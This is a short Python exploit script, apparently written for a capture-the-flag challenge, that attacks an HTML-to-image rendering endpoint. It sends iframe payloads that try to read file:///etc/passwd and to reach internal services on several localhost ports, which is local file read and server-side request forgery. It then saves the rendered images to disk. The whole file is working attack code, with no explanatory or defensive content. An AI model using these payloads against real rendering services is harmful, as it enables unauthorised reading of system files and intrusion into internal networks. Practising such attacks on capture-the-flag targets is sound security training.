import requests, io, zipfile

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})

def render_save(html, name):
    r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=40)
    if r.status_code == 200 and r.headers.get('Content-Type','').startswith('application/zip'):
        z = zipfile.ZipFile(io.BytesIO(r.content))
        for n in z.namelist():
            data = z.read(n)
            out = f'f:/mission-git-hackss/mission-git-hackss/probe_{name}.jpg'
            with open(out, 'wb') as f:
                f.write(data)
            print(f'{name}: saved {out} ({len(data)} bytes)')
    else:
        print(f'{name}: [{r.status_code}] {r.text[:200]}')

# Big iframe loading file:///etc/passwd to see if file:// works
render_save('<iframe src="file:///etc/passwd" style="width:1000px;height:1000px;border:0"></iframe>', 'file_passwd')

# iframe to localhost helper (common ports)
for port in [3000, 8000, 8080, 5000, 80]:
    render_save(f'<iframe src="http://localhost:{port}/" style="width:1000px;height:1000px;border:0"></iframe>', f'localhost_{port}')
